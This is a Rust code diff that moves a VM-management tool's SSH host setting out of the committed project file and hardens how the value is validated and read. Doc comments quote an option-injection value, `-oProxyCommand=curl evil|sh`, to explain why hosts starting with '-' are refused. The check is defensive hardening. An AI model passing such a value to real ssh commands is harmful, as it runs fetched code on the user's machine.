@@ -5,6 +5,13 @@
 //! truth and the host holds only a cache. This module reads
 //! that per-project configuration.
 //!
+//! **The VM host is not part of it.** Which machine runs the
+//! VMs is a property of the developer, not of the project --
+//! each person has their own hardware on their own network --
+//! so `host` comes from a per-developer file, the environment
+//! or `--host`, and is refused in `bombyx.toml`. See
+//! [`HostSources`] for the order they are consulted in.
+//!
 //! Because `bombyx.toml` ships *inside a repo*, it is
 //! attacker-controlled data the moment you clone or check out
 //! someone else's branch. Every field is therefore validated
@@ -84,6 +91,50 @@ pub enum ConfigError {
         /// What rule the value broke.
         reason: String,
     },
+
+    /// The committed project file carried a `host` key.
+    ///
+    /// Refused rather than ignored. A committed host names one
+    /// developer's machine, and a stale one that still parses
+    /// is how `destroy` ends up deleting a directory on a
+    /// colleague's host.
+    #[error(
+        "`host` is not allowed in {}: it names one developer's \
+         machine, and this file is committed. Move that line to \
+         {places}",
+        .path.display()
+    )]
+    HostInProjectFile {
+        /// The project file carrying the key.
+        path: PathBuf,
+        /// Where the value belongs instead.
+        places: String,
+    },
+
+    /// No source supplied a VM host.
+    #[error(
+        "no VM host configured -- set it in {places}, pass \
+         --host, or set {HOST_ENV}"
+    )]
+    HostMissing {
+        /// The files that would supply one.
+        places: String,
+    },
+
+    /// The winning source supplied an unusable host.
+    ///
+    /// Separate from [`ConfigError::Invalid`] so the message can
+    /// name *where the value came from*. As a plain field error
+    /// the only path in it was the project file's -- the one file
+    /// now forbidden to carry a host -- so the message sent the
+    /// operator to edit the wrong thing.
+    #[error("invalid VM host from {origin}: {reason}")]
+    InvalidHost {
+        /// Which source supplied it.
+        origin: String,
+        /// What rule the value broke.
+        reason: String,
+    },
 }
 
 /// Characters allowed in an SSH destination.
@@ -123,14 +174,38 @@ pub(crate) fn path_segments(path: &str) -> Vec<&str> {
         .collect()
 }
 
-/// A bombyx project configuration.
-#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
-#[serde(deny_unknown_fields)]
+/// File name of the per-developer configuration, inside the
+/// directory [`user_config_dir`] returns.
+pub const USER_CONFIG_FILE: &str = "config.toml";
+
+/// Environment variable naming the VM host directly.
+pub const HOST_ENV: &str = "BOMBYX_HOST";
+
+/// Environment variable relocating the per-developer config
+/// directory.
+///
+/// Exists so a test -- or an operator keeping several setups
+/// apart -- can point bombyx at a directory of its own instead
+/// of the real one.
+pub const CONFIG_DIR_ENV: &str = "BOMBYX_CONFIG_HOME";
+
+/// A resolved bombyx configuration.
+///
+/// The project fields come from `bombyx.toml`; `host` does not
+/// (see [`HostSources`]).
+#[derive(Debug, Clone, PartialEq, Eq)]
 pub struct Config {
-    /// SSH host alias of the VM host, e.g. `frosti`.
+    /// SSH host alias of the VM host, e.g. `vmhost`.
     ///
     /// Resolved through the user's `~/.ssh/config`, so
     /// bombyx never deals with addresses or usernames.
+    ///
+    /// **Never read from `bombyx.toml`.** The VM host is a
+    /// property of the person driving bombyx, not of the
+    /// project: everyone on a team has their own machine on
+    /// their own network, and a committed file can name only
+    /// one of them -- pointing everyone else's `destroy` at a
+    /// colleague's host.
     pub host: String,
 
     /// Project name. Doubles as the directory name on the
@@ -138,13 +213,207 @@ pub struct Config {
     pub project: String,
 
     /// Directory in the project repo holding the Vagrantfile.
-    #[serde(default = "default_vagrant_dir")]
     pub vagrant_dir: String,
 
     /// Root directory on the VM host under which project
     /// directories are created.
-    #[serde(default = "default_remote_root")]
     pub remote_root: String,
+}
+
+/// The committed project file, exactly as it parses.
+///
+/// Separate from [`Config`] because the two differ: this is
+/// what `bombyx.toml` may contain, and `Config` is what bombyx
+/// runs with after a host has been found elsewhere.
+///
+/// `host` appears here only so it can be *rejected* by name.
+/// Leaving it out would make `deny_unknown_fields` report
+/// "unknown field `host`", which reads as a typo rather than as
+/// a field that deliberately moved.
+#[derive(Debug, Deserialize)]
+#[serde(deny_unknown_fields)]
+struct ProjectFile {
+    host: Option<String>,
+
+    project: String,
+
+    #[serde(default = "default_vagrant_dir")]
+    vagrant_dir: String,
+
+    #[serde(default = "default_remote_root")]
+    remote_root: String,
+}
+
+/// The per-developer configuration file.
+///
+/// Only `host` for now. It is a separate shape from [`Overlay`]
+/// because this file is not beside a project and cannot
+/// meaningfully carry `project`.
+#[derive(Debug, Deserialize)]
+#[serde(deny_unknown_fields)]
+struct UserFile {
+    host: Option<String>,
+}
+
+/// Where a VM host name may come from, highest precedence
+/// first.
+///
+/// The binary fills this in from its command line and
+/// environment; tests construct it directly, which is why the
+/// environment is a field rather than something read in place.
+#[derive(Debug, Clone, Default)]
+pub struct HostSources<'a> {
+    /// `--host`, for a one-off run against another machine.
+    pub flag: Option<&'a str>,
+
+    /// The [`HOST_ENV`] environment variable.
+    pub env: Option<&'a str>,
+
+    /// Directory holding [`USER_CONFIG_FILE`], usually from
+    /// [`user_config_dir`].
+    pub user_config_dir: Option<&'a Path>,
+}
+
+/// A path as it appears in a message.
+fn path_display(path: &Path) -> String {
+    path.display().to_string()
+}
+
+/// What is wrong with a host value.
+///
+/// One rule, two error shapes. [`Config::validate`] reports it as
+/// a *field* problem, and [`Config::load`] reports it as a
+/// problem with a *source* -- naming `--host` or the file the
+/// value came from. Writing the rule once is what keeps the two
+/// messages from drifting apart.
+enum HostProblem {
+    /// Blank, so no host at all.
+    Empty,
+    /// Present but outside the allowed shape.
+    Invalid(String),
+}
+
+/// Checks a host value, whatever supplied it.
+///
+/// `host` reaches `ssh` and `scp` as their first positional
+/// argument and neither honours a `--` end-of-options separator,
+/// so a leading `-` is read as an option:
+/// `-oProxyCommand=curl evil|sh` runs code on this workstation
+/// from a bare `bombyx status`, before any network traffic.
+fn host_problem(value: &str) -> Option<HostProblem> {
+    if value.trim().is_empty() {
+        return Some(HostProblem::Empty);
+    }
+    if value.starts_with('-') {
+        return Some(HostProblem::Invalid(
+            "must not start with `-`, which ssh and scp read as \
+             an option"
+                .to_owned(),
+        ));
+    }
+    if let Some(bad) = value.chars().find(|c| !is_host_char(*c)) {
+        return Some(HostProblem::Invalid(format!(
+            "character {bad:?} is not allowed; use only letters, \
+             digits, `.`, `_`, `-` or `@`"
+        )));
+    }
+    None
+}
+
+/// Whether an environment-supplied directory is safe to use.
+///
+/// Requires an anchored path: a POSIX root, a Windows root, or a
+/// drive *with* a separator. Rooted spellings are checked
+/// directly rather than through [`Path::is_absolute`], which
+/// answers per-platform -- `C:\x` is not absolute on Unix and
+/// `/x` is not absolute on Windows, while this same code reads
+/// the same environment on both.
+///
+/// `C:cfg` is refused along with `cfg`: a drive-relative path
+/// resolves against that drive's current directory, which is not
+/// a location the operator chose either.
+fn is_anchored_dir(value: &str) -> bool {
+    let value = value.trim();
+    if value.starts_with('/') || value.starts_with('\\') {
+        return true;
+    }
+    let bytes = value.as_bytes();
+    bytes.len() >= 3
+        && bytes[0].is_ascii_alphabetic()
+        && bytes[1] == b':'
+        && (bytes[2] == b'/' || bytes[2] == b'\\')
+}
+
+/// Returns the directory holding the per-developer config.
+///
+/// [`CONFIG_DIR_ENV`] wins when set. Otherwise this is
+/// `%APPDATA%\bombyx` on Windows and
+/// `$XDG_CONFIG_HOME/bombyx` -- or `$HOME/.config/bombyx` --
+/// elsewhere. `None` when the environment names no home at
+/// all, which is a machine bombyx cannot guess about.
+///
+/// Every value must be an *anchored* path; a blank or relative
+/// one counts as unset and the next source is consulted. A
+/// relative value would otherwise resolve against the working
+/// directory, which on this tool means taking the VM host out of
+/// whatever repo bombyx was run in.
+#[must_use]
+pub fn user_config_dir() -> Option<PathBuf> {
+    config_dir_from(|key| std::env::var(key).ok(), cfg!(windows))
+}
+
+/// [`user_config_dir`] against an arbitrary environment.
+///
+/// `var` is split out so the precedence is testable without
+/// mutating the process environment, which is global and would
+/// make these tests race each other. `windows` is split out for
+/// the same reason and gates `APPDATA`.
+///
+/// **`APPDATA` is consulted only when `windows`.** It is
+/// routinely set in processes that are not Windows -- under WSL
+/// via `WSLENV`, under Wine, in some CI images -- so checking it
+/// unconditionally made a Linux run read a *Windows* config
+/// directory in preference to `$HOME/.config`, silently taking
+/// the host name from a file the docs said applied only to
+/// Windows.
+fn config_dir_from<F>(var: F, windows: bool) -> Option<PathBuf>
+where
+    F: Fn(&str) -> Option<String>,
+{
+    // A value that is blank *or not anchored* is treated as
+    // unset, and the next source is consulted.
+    //
+    // Blank was the original rule, for a stated reason: set to
+    // "" by a launcher script it would resolve to a relative
+    // `bombyx/config.toml` in the working directory, which on
+    // this tool means reading a host name out of the repo -- the
+    // one thing this design removes. A *non-blank relative*
+    // value does exactly the same thing and was not covered:
+    // `BOMBYX_CONFIG_HOME=.` reads `./config.toml`,
+    // `XDG_CONFIG_HOME=.config` reads
+    // `./.config/bombyx/config.toml`, and `..` walks out of the
+    // tree. Such a value arrives from a per-directory
+    // environment (`direnv`, a `mise.toml` in a clone, a CI job)
+    // or a plain typo, and the host it supplies decides where
+    // `up` scps an archive and where `destroy` runs `rm -rf`.
+    let set = |key: &str| {
+        var(key)
+            .filter(|v| is_anchored_dir(v))
+            .map(|v| v.trim().to_owned())
+    };
+
+    if let Some(dir) = set(CONFIG_DIR_ENV) {
+        return Some(PathBuf::from(dir));
+    }
+    if windows {
+        return set("APPDATA")
+            .map(|appdata| Path::new(&appdata).join("bombyx"));
+    }
+    if let Some(xdg) = set("XDG_CONFIG_HOME") {
+        return Some(Path::new(&xdg).join("bombyx"));
+    }
+    let home = set("HOME")?;
+    Some(Path::new(&home).join(".config").join("bombyx"))
 }
 
 fn default_vagrant_dir() -> String {
@@ -155,20 +424,29 @@ fn default_remote_root() -> String {
     DEFAULT_REMOTE_ROOT.to_owned()
 }
 
-/// Per-developer overrides, read from a file beside the config.
+/// Per-project overrides, read from a file beside the config.
 ///
 /// Every field is optional, so an overlay names only what
-/// differs. `host` is the reason this exists: a team shares one
-/// `bombyx.toml`, but each member has their own VM host, and a
-/// committed file can only name one of them.
+/// differs. This is the escape hatch for one repo that needs
+/// something other than the shared value -- a second VM host
+/// for one project, or a different `remote_root` on one
+/// machine. The usual per-developer host lives in the
+/// `config.toml` that [`HostSources::user_config_dir`] points
+/// at, not here; this file outranks it.
 ///
-/// The same `deny_unknown_fields` treatment as [`Config`]: a
-/// typo here must be an error rather than a setting that
-/// silently does nothing.
+/// The same `deny_unknown_fields` treatment as the project
+/// file: a typo here must be an error rather than a setting
+/// that silently does nothing.
 #[derive(Debug, Clone, Default, PartialEq, Eq, Deserialize)]
 #[serde(deny_unknown_fields)]
 pub struct Overlay {
-    /// Replaces [`Config::host`].
+    /// Supplies [`Config::host`] for this project, outranked
+    /// only by `--host` and [`HOST_ENV`].
+    ///
+    /// [`Config::load`] *takes* this value while ranking the
+    /// sources, so the overlay it later merges carries `None`.
+    /// [`Config::with_overlay`] therefore never applies it --
+    /// see that method.
     pub host: Option<String>,
     /// Replaces [`Config::project`].
     pub project: Option<String>,
@@ -182,6 +460,144 @@ pub struct Overlay {
 fn replace(dst: &mut String, src: Option<String>) {
     if let Some(value) = src {
         *dst = value;
+    }
+}
+
+impl ProjectFile {
+    /// Assembles a [`Config`], applying `overlay` to the
+    /// project fields.
+    fn into_config(self, host: String, overlay: Option<Overlay>) -> Config {
+        let cfg = Config {
+            host,
+            project: self.project,
+            vagrant_dir: self.vagrant_dir,
+            remote_root: self.remote_root,
+        };
+        match overlay {
+            Some(overlay) => cfg.with_overlay(overlay),
+            None => cfg,
+        }
+    }
+}
+
+/// Refuses a project file carrying a `host` key.
+///
+/// Ignoring it with a warning was the alternative, and it is
+/// worse: the key stays committed in the repo, the warning gets
+/// tuned out, and the next reader cannot tell whether the value
+/// is in force. An error is read once and fixed once.
+fn reject_host_key(
+    file: &ProjectFile,
+    path: &Path,
+    sources: &HostSources,
+) -> Result<(), ConfigError> {
+    if file.host.is_none() {
+        return Ok(());
+    }
+    Err(ConfigError::HostInProjectFile {
+        path: path.to_path_buf(),
+        places: host_places(sources, local_config_path(path).as_deref()),
+    })
+}
+
+/// Which source supplied [`Config::host`].
+///
+/// Returned by [`Config::load`] so a caller can *report* the
+/// winner instead of re-deriving it. The binary printed the
+/// provenance by re-testing the flag and the environment itself,
+/// which duplicated the precedence rule below in code no library
+/// test could reach: rank the overlay differently here, and the
+/// message kept naming the old winner.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum HostOrigin {
+    /// The `--host` flag.
+    Flag,
+    /// The [`HOST_ENV`] environment variable.
+    Env,
+    /// A `bombyx.local.toml` beside the project file.
+    Overlay,
+    /// The per-developer [`USER_CONFIG_FILE`].
+    UserFile,
+}
+
+impl std::fmt::Display for HostOrigin {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        let name = match self {
+            Self::Flag => "--host",
+            Self::Env => HOST_ENV,
+            Self::Overlay => "bombyx.local.toml",
+            Self::UserFile => USER_CONFIG_FILE,
+        };
+        f.write_str(name)
+    }
+}
+
+/// Finds the VM host, highest-precedence source first.
+///
+/// `local` is the overlay's path, named only in the
+/// no-host-anywhere error.
+///
+/// Takes the overlay by `&mut` and *removes* the host it finds,
+/// so the value is consumed where it is ranked. What is left
+/// provably carries no host, which is what makes
+/// [`Config::with_overlay`] ignoring the field safe rather than
+/// merely intended.
+///
+/// The per-developer file is read *last* and only if it is
+/// needed, so `--host` works on a machine whose file is absent
+/// or broken.
+///
+/// A blank [`HOST_ENV`] counts as unset. An exported-but-empty
+/// variable is how a shell says "no value", and reporting "no
+/// VM host configured" is more use than an empty-field error.
+/// A host supplied directly by the caller is *not* treated that
+/// way: it was asked for, so the empty-value error names it.
+fn resolve_host(
+    sources: &HostSources,
+    overlay: Option<&mut Overlay>,
+    local: Option<&Path>,
+) -> Result<(String, HostOrigin), ConfigError> {
+    if let Some(host) = sources.flag {
+        return Ok((host.to_owned(), HostOrigin::Flag));
+    }
+    if let Some(host) = sources.env.filter(|v| !v.trim().is_empty()) {
+        return Ok((host.to_owned(), HostOrigin::Env));
+    }
+    if let Some(host) = overlay.and_then(|o| o.host.take()) {
+        return Ok((host, HostOrigin::Overlay));
+    }
+    if let Some(dir) = sources.user_config_dir {
+        let path = dir.join(USER_CONFIG_FILE);
+        if let Some(source) = read_optional(&path, Symlinks::Follow)? {
+            let file: UserFile = from_toml(&source, &path)?;
+            if let Some(host) = file.host {
+                return Ok((host, HostOrigin::UserFile));
+            }
+        }
+    }
+    Err(ConfigError::HostMissing {
+        places: host_places(sources, local),
+    })
+}
+
+/// Names the files that can carry a host, for an error message.
+///
+/// Both are paths the operator can act on, so they are printed
+/// in full rather than described.
+fn host_places(sources: &HostSources, local: Option<&Path>) -> String {
+    let user = sources.user_config_dir.map(|d| d.join(USER_CONFIG_FILE));
+    match (user, local) {
+        (Some(user), Some(local)) => {
+            format!("{} or {}", user.display(), local.display())
+        }
+        (Some(user), None) => user.display().to_string(),
+        (None, Some(local)) => local.display().to_string(),
+        // No home directory in the environment and no project
+        // file with a name, so there is nothing concrete to
+        // point at.
+        (None, None) => {
+            format!("a {USER_CONFIG_FILE} in your config directory")
+        }
     }
 }
 
@@ -245,6 +661,20 @@ where
     })
 }
 
+/// Whether a config file may be a symlink.
+///
+/// Named rather than a bare `bool` so the two call sites read as
+/// a policy choice instead of a flag.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Symlinks {
+    /// Judge the path as itself: a symlink is refused. For files
+    /// beside the project config, whose path a repo influences.
+    Refuse,
+    /// Follow the link, still requiring a regular file at the
+    /// end. For the operator's own dotfile.
+    Follow,
+}
+
 /// Reads a config file that is allowed not to exist.
 ///
 /// Absence is `None`. Anything else is an error rather than a
@@ -252,24 +682,37 @@ where
 /// problem to report, not a reason to quietly send commands to
 /// the host the operator meant to override.
 ///
-/// Two refusals matter more than they look, because this path
-/// is *derived* rather than named by the operator, and the file
-/// it points at can come from a repo.
+/// Anything that is not a regular file is rejected -- pointed at
+/// `/dev/zero` or a FIFO, reading would hang or allocate without
+/// bound -- and the size cap bounds an ordinary large file.
 ///
-/// Anything that is not a regular file is rejected, and the
-/// check is [`std::fs::symlink_metadata`] so a symlink is
-/// judged as itself rather than followed. A repo can commit a
-/// symlink; pointed at `~/.ssh/id_ed25519` it would make the
-/// TOML parse error echo a line of the key to stderr, and
-/// pointed at `/dev/zero` or a FIFO it would hang or allocate
-/// without bound.
+/// `symlinks` decides how the path itself is judged, and the two
+/// answers are not arbitrary:
 ///
-/// The size cap then bounds an ordinary large file, which a
-/// repo can also commit.
-fn read_optional(path: &Path) -> Result<Option<String>, ConfigError> {
+/// - [`Symlinks::Refuse`] for `bombyx.toml` and the overlay
+///   beside it. That path is *derived* and a repo can commit a
+///   symlink there; pointed at `~/.ssh/id_ed25519` it would make
+///   the TOML parse error echo a line of the key to stderr.
+/// - [`Symlinks::Follow`] for the per-developer `config.toml`.
+///   Nothing in a clone can create or retarget a file in the
+///   operator's own config directory, so the refusal buys nothing
+///   there -- and it broke every ordinary dotfile manager
+///   (`stow`, `chezmoi`, a hand-made `ln -s`), which symlink
+///   exactly this kind of file into place. The failure was a hard
+///   error on every subcommand whose message did not mention
+///   symlinks.
+fn read_optional(
+    path: &Path,
+    symlinks: Symlinks,
+) -> Result<Option<String>, ConfigError> {
     use std::io::Read as _;
 
-    let meta = match std::fs::symlink_metadata(path) {
+    let stat = match symlinks {
+        Symlinks::Refuse => std::fs::symlink_metadata,
+        Symlinks::Follow => std::fs::metadata,
+    };
+
+    let meta = match stat(path) {
         Ok(meta) => meta,
         Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
             return Ok(None);
@@ -335,37 +778,52 @@ impl Config {
     /// Does not validate: the caller validates once, after
     /// merging, so an overlay cannot become the one path into
     /// the config that skips the checks the base file passes.
+    ///
+    /// **`Overlay::host` is not applied.** The host is ranked
+    /// against `--host` and [`HOST_ENV`] by [`Config::load`],
+    /// which *takes* the overlay's value in the process, so the
+    /// overlay reaching this method carries `None`. Applying it
+    /// here as well would silently promote the file above two
+    /// sources that outrank it. A caller building an [`Overlay`]
+    /// by hand and setting `host` will find it ignored -- resolve
+    /// the host first and pass it to [`Config::parse`] instead.
     #[must_use]
     pub fn with_overlay(mut self, overlay: Overlay) -> Self {
         // Destructured rather than read field by field: adding
         // a field to `Overlay` then fails to compile here,
         // instead of parsing fine and silently doing nothing.
         let Overlay {
-            host,
+            host: _,
             project,
             vagrant_dir,
             remote_root,
         } = overlay;
 
-        replace(&mut self.host, host);
         replace(&mut self.project, project);
         replace(&mut self.vagrant_dir, vagrant_dir);
         replace(&mut self.remote_root, remote_root);
         self
     }
 
-    /// Parses a configuration from TOML source.
+    /// Parses a project file, with `host` supplied separately.
     ///
     /// `path` is used only for error messages.
     ///
     /// # Errors
     ///
     /// Returns [`ConfigError::Parse`] if the source is not
-    /// valid TOML or carries an unknown key, and
-    /// [`ConfigError::Empty`] / [`ConfigError::Invalid`] if a
-    /// field fails validation.
-    pub fn parse(source: &str, path: &Path) -> Result<Self, ConfigError> {
-        let cfg: Self = from_toml(source, path)?;
+    /// valid TOML or carries an unknown key,
+    /// [`ConfigError::HostInProjectFile`] if it carries a
+    /// `host` key, and [`ConfigError::Empty`] /
+    /// [`ConfigError::Invalid`] if a field fails validation.
+    pub fn parse(
+        source: &str,
+        path: &Path,
+        host: &str,
+    ) -> Result<Self, ConfigError> {
+        let file: ProjectFile = from_toml(source, path)?;
+        reject_host_key(&file, path, &HostSources::default())?;
+        let cfg = file.into_config(host.to_owned(), None);
         cfg.validate()?;
         Ok(cfg)
     }
@@ -380,74 +838,145 @@ impl Config {
     #[must_use]
     pub(crate) fn for_tests() -> Self {
         Self::parse(
-            "host = \"frosti\"\nproject = \"phren\"\n",
+            "project = \"myproject\"\n",
             Path::new("bombyx.toml"),
+            "vmhost",
         )
         .expect("the shared test config must be valid")
     }
 
-    /// Loads a configuration from a file, and the per-developer
-    /// overlay beside it.
+    /// Loads a configuration: the project file, the overlay
+    /// beside it, and a VM host from `sources`.
     ///
-    /// **This reads two paths, not one.** After `path`, it
-    /// looks for the overlay named by [`local_config_path`] --
+    /// **This reads up to three paths.** After `path`, it looks
+    /// for the overlay named by [`local_config_path`] --
     /// `bombyx.toml` next to `bombyx.local.toml` -- and merges
-    /// it over the file when present. The overlay is optional;
-    /// one that exists but cannot be read or parsed is an error
-    /// rather than a silent fallback to the committed values.
+    /// it over the file when present. If neither `sources.flag`,
+    /// `sources.env` nor the overlay names a host, the
+    /// per-developer file in `sources.user_config_dir` is read
+    /// for one. An optional file that exists but cannot be read
+    /// or parsed is an error rather than a silent fallback.
     ///
-    /// Validation runs once, after the merge, so an override is
-    /// subject to the same rules as the file it overrides.
+    /// The user file is read only when nothing else supplied a
+    /// host, so `--host` still works on a machine whose
+    /// per-developer file is missing or broken.
+    ///
+    /// Validation runs once, after everything is merged, so an
+    /// override is subject to the same rules as the file it
+    /// overrides.
+    ///
+    /// Returns the winning [`HostOrigin`] alongside the config,
+    /// so a caller reporting which host is in force does not
+    /// re-derive the precedence rule.
     ///
     /// # Errors
     ///
     /// Returns [`ConfigError::NotFound`] if `path` is absent,
-    /// [`ConfigError::Read`] if either file cannot be read,
+    /// [`ConfigError::Read`] if a file cannot be read,
     /// [`ConfigError::NotAFile`] or [`ConfigError::TooLarge`]
-    /// if either is not a plain file of sensible size,
-    /// [`ConfigError::Parse`] if either is not valid TOML, and
-    /// [`ConfigError::Empty`] / [`ConfigError::Invalid`] if a
-    /// field fails validation after merging. The path carried
-    /// by an error may be the overlay's rather than `path`.
-    pub fn load(path: &Path) -> Result<Self, ConfigError> {
+    /// if one is not a plain file of sensible size,
+    /// [`ConfigError::Parse`] if one is not valid TOML,
+    /// [`ConfigError::HostInProjectFile`] if the project file
+    /// carries a `host` key, [`ConfigError::HostMissing`] if no
+    /// source names a host, and [`ConfigError::Empty`] /
+    /// [`ConfigError::Invalid`] if a field fails validation
+    /// after merging. The path carried by an error may be an
+    /// optional file's rather than `path`.
+    pub fn load(
+        path: &Path,
+        sources: &HostSources,
+    ) -> Result<(Self, HostOrigin), ConfigError> {
         // Absence is the one io error that means something
         // different for the two files, so it is mapped here
         // rather than inside the shared reader.
-        let source = read_optional(path)?
+        let source = read_optional(path, Symlinks::Refuse)?
             .ok_or_else(|| ConfigError::NotFound(path.to_path_buf()))?;
 
-        let cfg: Self = from_toml(&source, path)?;
+        let file: ProjectFile = from_toml(&source, path)?;
+        reject_host_key(&file, path, sources)?;
+
+        let local = local_config_path(path);
+        let mut overlay = match &local {
+            Some(local) => match read_optional(local, Symlinks::Refuse)? {
+                Some(source) => Some(from_toml::<Overlay>(&source, local)?),
+                None => None,
+            },
+            None => None,
+        };
+
+        let (host, origin) =
+            resolve_host(sources, overlay.as_mut(), local.as_deref())?;
+
+        // Checked here, while the winning source is still known,
+        // so the message names the file (or flag) actually
+        // carrying the bad value rather than the project file.
+        if let Some(problem) = host_problem(&host) {
+            return Err(ConfigError::InvalidHost {
+                origin: match origin {
+                    HostOrigin::Overlay => local
+                        .as_deref()
+                        .map_or_else(|| origin.to_string(), path_display),
+                    HostOrigin::UserFile => sources
+                        .user_config_dir
+                        .map(|d| d.join(USER_CONFIG_FILE))
+                        .map_or_else(
+                            || origin.to_string(),
+                            |p| path_display(&p),
+                        ),
+                    HostOrigin::Flag | HostOrigin::Env => origin.to_string(),
+                },
+                reason: match problem {
+                    HostProblem::Empty => "must not be empty".to_owned(),
+                    HostProblem::Invalid(reason) => reason,
+                },
+            });
+        }
 
         // Validation happens once, after merging. Validating
         // the base first would let an overlay set a value the
         // base file could never carry.
-        let cfg = match local_config_path(path) {
-            Some(local) => match read_optional(&local)? {
-                Some(source) => cfg.with_overlay(from_toml(&source, &local)?),
-                None => cfg,
-            },
-            None => cfg,
-        };
-
+        let cfg = file.into_config(host, overlay);
         cfg.validate()?;
-        Ok(cfg)
+        Ok((cfg, origin))
     }
 
     /// Rejects values that are empty or outside their allowed
     /// shape.
     ///
-    /// The `host` rules are the load-bearing ones. `host` is
-    /// passed as the first positional argument to `ssh` and
-    /// `scp`, and neither program honours a `--`
-    /// end-of-options separator. A value starting with `-` is
-    /// therefore read as an *option*, so a repo shipping
-    /// `host = "-oProxyCommand=curl evil|sh"` would run code
-    /// on this workstation from a bare `bombyx status` --
-    /// before any network traffic. Restricting the charset
-    /// closes that.
+    /// The `host` rules matter most. `host` is passed as the
+    /// first positional argument to `ssh` and `scp`, and
+    /// neither program honours a `--` end-of-options
+    /// separator. A value starting with `-` is therefore read
+    /// as an *option*, so `-oProxyCommand=curl evil|sh` runs
+    /// code on this workstation from a bare `bombyx status`,
+    /// before any network traffic.
+    ///
+    /// That value can no longer arrive from a cloned repo,
+    /// because `host` is refused in `bombyx.toml` (see
+    /// [`ConfigError::HostInProjectFile`]). The check stays for
+    /// the sources that remain: a gitignored
+    /// `bombyx.local.toml`, a per-developer `config.toml`, and
+    /// `--host` / [`HOST_ENV`], all of which a mistake or a
+    /// careless script can still fill in. The other fields are
+    /// still repo-supplied, so their rules carry the original
+    /// weight.
     fn validate(&self) -> Result<(), ConfigError> {
+        // The host rule lives in `host_problem`, so this and the
+        // source-naming check in `load` cannot disagree.
+        match host_problem(&self.host) {
+            Some(HostProblem::Empty) => {
+                return Err(ConfigError::Empty { field: "host" });
+            }
+            Some(HostProblem::Invalid(reason)) => {
+                return Err(ConfigError::Invalid {
+                    field: "host",
+                    reason,
+                });
+            }
+            None => {}
+        }
+
         for (field, value) in [
-            ("host", &self.host),
             ("project", &self.project),
             ("vagrant_dir", &self.vagrant_dir),
             ("remote_root", &self.remote_root),
@@ -464,14 +993,6 @@ impl Config {
                 });
             }
         }
-
-        charset(
-            "host",
-            &self.host,
-            is_host_char,
-            "letters, \
-            digits, `.`, `_`, `-` or `@`",
-        )?;
 
         // `project` becomes one directory name on the host.
         check_segment(&self.project).map_err(|e| ConfigError::Invalid {
@@ -571,7 +1092,7 @@ impl Config {
     }
 
     /// Returns the project directory on the VM host, e.g.
-    /// `~/vms/phren`.
+    /// `~/vms/myproject`.
     ///
     /// A trailing slash on `remote_root` is ignored so the
     /// result never contains a doubled separator.
@@ -622,11 +1143,20 @@ mod tests {
     use super::*;
 
     fn minimal() -> &'static str {
-        "host = \"frosti\"\nproject = \"phren\"\n"
+        "project = \"myproject\"\n"
     }
 
     fn parse(source: &str) -> Result<Config, ConfigError> {
-        Config::parse(source, Path::new("bombyx.toml"))
+        Config::parse(source, Path::new("bombyx.toml"), "vmhost")
+    }
+
+    /// Parses the minimal project file with an explicit host.
+    ///
+    /// The host no longer comes from the file being parsed, so
+    /// a test about host values varies this argument rather than
+    /// the TOML.
+    fn parse_with_host(host: &str) -> Result<Config, ConfigError> {
+        Config::parse(minimal(), Path::new("bombyx.toml"), host)
     }
 
     fn good() -> Config {
@@ -640,15 +1170,15 @@ mod tests {
     #[test]
     fn parses_minimal_config_and_applies_defaults() {
         let cfg = good();
-        assert_eq!(cfg.host, "frosti");
-        assert_eq!(cfg.project, "phren");
+        assert_eq!(cfg.host, "vmhost");
+        assert_eq!(cfg.project, "myproject");
         assert_eq!(cfg.vagrant_dir, "vagrant");
         assert_eq!(cfg.remote_root, "~/vms");
     }
 
     #[test]
     fn parses_explicit_overrides() {
-        let src = "host = \"fusion\"\nproject = \"ledgerstone\"\n\
+        let src = "project = \"ledgerstone\"\n\
                    vagrant_dir = \"infra/vm\"\n\
                    remote_root = \"/srv/vms\"\n";
         let cfg = parse(src).unwrap();
@@ -681,9 +1211,7 @@ mod tests {
             "vagrant/../../.ssh",
             "./vagrant",
         ] {
-            let src = format!(
-                "host = \"h\"\nproject = \"p\"\nvagrant_dir = {bad:?}\n"
-            );
+            let src = format!("project = \"p\"\nvagrant_dir = {bad:?}\n");
             let err = parse(&src).unwrap_err();
             assert!(
                 matches!(
@@ -701,9 +1229,7 @@ mod tests {
     #[test]
     fn accepts_a_relative_vagrant_dir() {
         for good in ["vagrant", "infra/vm", "a/b/c"] {
-            let src = format!(
-                "host = \"h\"\nproject = \"p\"\nvagrant_dir = {good:?}\n"
-            );
+            let src = format!("project = \"p\"\nvagrant_dir = {good:?}\n");
             assert_eq!(parse(&src).unwrap().vagrant_dir, good);
         }
     }
@@ -730,27 +1256,36 @@ mod tests {
 
     #[test]
     fn overlay_replaces_only_the_fields_it_sets() {
-        // The point of the file: `host` is per-developer, the
-        // rest of the config is shared, so an overlay naming
-        // only `host` must leave everything else alone.
-        let overlay: Overlay = toml::from_str("host = \"fusion\"").unwrap();
+        // An overlay naming one field must leave the rest
+        // alone.
+        let overlay: Overlay = toml::from_str("project = \"other\"").unwrap();
         let cfg = good().with_overlay(overlay);
-        assert_eq!(cfg.host, "fusion");
-        assert_eq!(cfg.project, "phren");
+        assert_eq!(cfg.project, "other");
+        assert_eq!(cfg.host, "vmhost");
         assert_eq!(cfg.vagrant_dir, "vagrant");
         assert_eq!(cfg.remote_root, "~/vms");
     }
 
     #[test]
-    fn overlay_can_set_every_field() {
-        // Every `Config` field must be overridable. This test
-        // is what fails when a field is added to `Config` and
-        // to `Overlay` but the two are never actually wired
+    fn with_overlay_does_not_apply_host() {
+        // `host` is ranked against `--host` and the environment
+        // by `resolve_host`, both of which outrank the file.
+        // Applying it here as well would silently promote the
+        // file above them, so this seam is asserted rather than
+        // left to a comment.
+        let overlay: Overlay = toml::from_str("host = \"my-vmhost\"").unwrap();
+        assert_eq!(good().with_overlay(overlay).host, "vmhost");
+    }
+
+    #[test]
+    fn overlay_can_set_every_project_field() {
+        // Every project field must be overridable. This test is
+        // what fails when a field is added to `Config` and to
+        // `Overlay` but the two are never actually wired
         // together.
-        let src = "host = \"h\"\nproject = \"p\"\n\
+        let src = "project = \"p\"\n\
                    vagrant_dir = \"vm\"\nremote_root = \"/srv/v\"\n";
